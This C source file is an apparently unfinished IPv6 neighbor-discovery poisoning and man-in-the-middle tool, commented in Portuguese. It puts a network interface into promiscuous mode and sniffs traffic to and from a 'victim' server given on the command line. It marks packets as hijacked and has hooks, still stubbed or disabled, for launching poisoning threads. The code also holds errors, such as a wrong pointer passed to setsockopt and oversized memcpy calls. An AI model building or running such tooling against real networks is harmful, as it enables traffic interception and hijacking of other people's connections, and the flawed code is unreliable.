#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <netdb.h>
#include <ifaddrs.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include <linux/if_packet.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <netinet/ether.h>

#include <pthread.h>
#include <victims.h>
#include <packets.h>
#include <device.h>

#define DEBUG 0

static int raw_socket(int proto) {
	int rawsock;

	if ((rawsock = socket(PF_PACKET, SOCK_RAW, htons(proto))) < 0) {
		perror("Error creating raw socket: ");
		exit(-1);
	}

	return rawsock;
}

static int bind_socket_to_device(char *device, int rawsock) {
	struct packet_mreq *pkt;
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(ifr));

	strncpy((char *)ifr.ifr_name, device, IFNAMSIZ);

	/* Go promisc */
	if ((ioctl(rawsock, SIOCGIFFLAGS, &ifr)) < 0) {
		perror("Error reading flags from device: ");
		exit(-1);
	}

	ifr.ifr_flags |= IFF_PROMISC;
	if ((ioctl(rawsock, SIOCSIFFLAGS, &ifr)) < 0) {
		perror("Error setting flags to device: ");
		exit(-1);
	}

	pkt = (struct packet_mreq *)malloc(sizeof(struct packet_mreq));
	memset((struct packet_mreq *)pkt, 0, sizeof(struct packet_mreq));
	pkt->mr_ifindex = ifr.ifr_ifindex;
	pkt->mr_type = PACKET_MR_PROMISC;
	setsockopt(rawsock, SOL_PACKET, PACKET_MR_PROMISC, (char *)&pkt,
			sizeof(struct packet_mreq));

	free(pkt);

	return 1;
}


void debug_packet(char *packet) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmpv6;
	struct tcphdr *tcp;
	char addr[INET6_ADDRSTRLEN];

//	eth = (struct ethhdr *)packet;
//	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	ip6 = (struct ip6_hdr *)(packet);

	if (ip6->ip6_nxt != IPPROTO_TCP && ip6->ip6_nxt != IPPROTO_ICMPV6)
		return;

	printf("\n- PACKET START -\n");
/*
	printf("Ethernet:\n");
	printf("\tEther src: %s\n", ether_ntoa((struct ether_addr *)eth->h_source));
	printf("\tEther dest: %s\n", ether_ntoa((struct ether_addr *)eth->h_dest));
*/
	printf("IPv6:\n");
	inet_ntop(AF_INET6, ip6->ip6_dst.s6_addr, addr, INET6_ADDRSTRLEN);
	printf("\tTo: %s\n", addr);
	memset(addr, 0, INET6_ADDRSTRLEN);
	inet_ntop(AF_INET6, ip6->ip6_src.s6_addr, addr, INET6_ADDRSTRLEN);
	printf("\tFrom: %s\n", addr);
	printf("\tPayload Length: 0x%x\n", ntohs(ip6->ip6_plen));

	switch (ip6->ip6_nxt) {
		case IPPROTO_ICMPV6:
			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			printf("ICMPv6:\n");
			printf("\tCode: %d\n", icmpv6->icmp6_code);
			printf("\tType: %d\n", icmpv6->icmp6_type);
			printf("\tCRC: %x\n", icmpv6->icmp6_cksum);
			break;
		case IPPROTO_TCP:
			tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			printf("TCP:\n");
			printf("\tDest Port: %d\n", tcp->dest);
			printf("\tSrc Port: %d\n", tcp->source);
			break;
		default:
			break;
	}
	printf("- PACKET END -\n\n");
}

void init_cvictim() {
	cvictim = NULL;
}

void debug_cvivtim(struct victim *cli) {
	char buf[INET6_ADDRSTRLEN];
	printf("HWADDR: %s\n", ether_ntoa(&(cli->hwaddr)));
	memset(buf, 0, INET6_ADDRSTRLEN);
	inet_ntop(AF_INET6, cli->ipv6.s6_addr, buf, INET6_ADDRSTRLEN);
	printf("IPv6: %s\n", buf);
}

struct cli_victim *get_cvictim(struct ethhdr *eth) {
	struct cli_victim *cli;
	struct ip6_hdr *ip6;
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));
	for (cli = cvictim; cli; cli = cli->nxt) {
		printf("entrei");
		if (memcmp(&(cli->cv_victim.hwaddr), &(eth->h_source),
							sizeof(struct ether_addr)) == 0) {
			printf("Cliente existente\n");
			return cli;
		}
	}
	printf("Cliente inexistente\n");
	cli = cvictim;
	cvictim = (struct cli_victim *)malloc(sizeof(struct cli_victim));
	cvictim->nxt = cli;
	memcpy(&(cvictim->cv_victim.hwaddr), &(eth->h_source), ETH_ALEN);
	//cvictim->cv_victim.ipv4
	memcpy(&(cvictim->cv_victim.ipv6), &(ip6->ip6_src), INET6_ADDRSTRLEN);
	cvictim->cv_victim.poisoned = 0;
	//cvictim->th = (struct pthread_t *)malloc(sizeof(struct pthread_t));
	return cvictim;
}

void *th_func(void *conn) {
	//poisoning
	printf("oiaeu\n");

	pthread_exit((void*)EXIT_SUCCESS);
}

void packet_action(char *packet) {
	struct ethhdr *eth;
	struct ip6_hdr *ip6;
	struct icmp6_hdr *icmpv6;
	struct tcphdr *tcp;
	unsigned short crc;
	struct cli_victim *cli;

	//debug_packet(packet);

	eth = (struct ethhdr *)packet;
#if 0
	if (ntohs(eth->h_proto) != ETH_P_IPV6) {
		// Not an IPv6 packet! :-)
		//printf("Not an IPv6 packet (%x)\n", ntohs(eth->h_proto));
		return;
	}
#endif
	ip6 = (struct ip6_hdr *)((char *)eth + sizeof(struct ethhdr));

	/* Pacote para nossa vitima. */
	if (!memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr))) {
		/* Se o mac destino for o do atacante, é pacote roubado */
		if (memcmp(&(eth->h_dest), &(device.hwaddr), ETH_ALEN) == 0) {
			/* TODO */
			printf("Packet Hijacked? :-)\n");
		} else if (ip6->ip6_nxt == IPPROTO_ICMPV6) {
			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			/* Se for uma solicitação de discover e o cliente ainda não foi
			 * "poisoned", dispara o poison. */
			if (icmpv6->icmp6_type == ND_NEIGHBOR_SOLICIT) {
				/* TODO */
				printf("Thread de poison para o client.\n");
			}
		}
	} else if (!memcmp(&(ip6->ip6_src), &(svictim.ipv6), sizeof(struct in6_addr))) {
		/* Pacote enviado pela nossa vitima. */
		if (ip6->ip6_nxt == IPPROTO_ICMPV6) {
			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			if (icmpv6->icmp6_type == ND_NEIGHBOR_ADVERT) {
				printf("Se não tivermos pegado o MAC do server, esse é o momento.\n");
			}
		}
	}


#if 0
		cli = get_cvictim(eth);

		printf("\e[32mDebug Cliente\n");
		debug_cvivtim(&cli->cv_victim);
		printf("Debug Vitima\n");
		debug_cvivtim(&svictim);
		printf("\e[0m");

		if (pthread_create(&(cli->th), 0, &th_func, cli)) {
			printf("Error creating thread\n");
			//printf("Client: %s", );
		}
	}
#endif
#if 0
	switch (ip6->ip6_nxt) {
		case IPPROTO_ICMPV6:
			icmpv6 = (struct icmp6_hdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			debug_packet((char *)ip6);
			icmpv6->icmp6_cksum = 0;
			if ((crc = icmp6_crc(icmpv6, ip6)) != 0) {
				printf("ICMPv6: CRC ERROR\n");
				printf("%x == %x\n", crc, icmpv6->icmp6_cksum);
			} else {
				printf("ICMPv6: CRC OK\n");
			}

			switch (icmpv6->icmp6_type) {
				case ND_NEIGHBOR_SOLICIT:
					if (!cvictim.poisoned) {
						printf("Start poisoning..\n");
						/* TODO:
						if (solicitation_to_svictim(icmpv6)) {
							cvictim.poisoned = 1;
							poison_cvictim(ip6->ip6_src.s6_addr);	// This should be a thread
						}
						*/
					}
					break;
				case ND_NEIGHBOR_ADVERT:
					/* TODO: Get server's hwaddr */
					break;
				default:
					break;
			}
			break;
		case IPPROTO_TCP:
			tcp = (struct tcphdr *)((char *)ip6 + sizeof(struct ip6_hdr));
			/* Check if it's a hijacked packet */
			if (!(memcmp(&device.hwaddr, eth->h_source, sizeof(struct ether_addr))) &&
					!(memcmp(&(ip6->ip6_dst), &(svictim.ipv6), sizeof(struct in6_addr)))) {
			}
			break;
		default:
			break;
	}
#endif
}

int main(int argc, char **argv) {
	int raw, len;
	char packet_buffer[2048];
	struct sockaddr_ll packet_info;
	char server_victim[INET6_ADDRSTRLEN];
	int packet_info_size = sizeof(packet_info);

	if (argc < 3) {
		printf("Usage: %s <interface> <victim's address>\n", argv[0]);
		exit(0);
	}

	load_device_info(argv[1]);
	dump_device_info();
	init_cvictim();
	/* create the raw socket */
	/* Maybe someday we will support other protocols */
	//raw = raw_socket(ETH_P_ALL);
	raw = raw_socket(ETH_P_IPV6);

	/* Bind socket to interface and going promisc */
	bind_socket_to_device(device.name, raw);

	/* Get number of packets to sniff from user */
	if (inet_pton(AF_INET6, argv[2], &svictim.ipv6) <= 0) {
		printf("Error setting victim's address\n");
		exit(EXIT_FAILURE);
	}
	inet_ntop(AF_INET6, &svictim.ipv6, server_victim, INET6_ADDRSTRLEN);
	printf("Server to attack: %s\n", server_victim);

#if 0
	/* START DEBUG TESTE */
	teste = alloc_pkt2big();
	packet_action(teste);
	free(teste);
	/* STOP DEBUG */
#endif

	while ((len = recvfrom(raw, packet_buffer, 2048, 0,
						(struct sockaddr*)&packet_info,
						(socklen_t *)&packet_info_size)) >= 0) {
			debug_packet((char *)packet_buffer+sizeof(struct ethhdr *));
			packet_action(packet_buffer);
	}

	return 0;
}
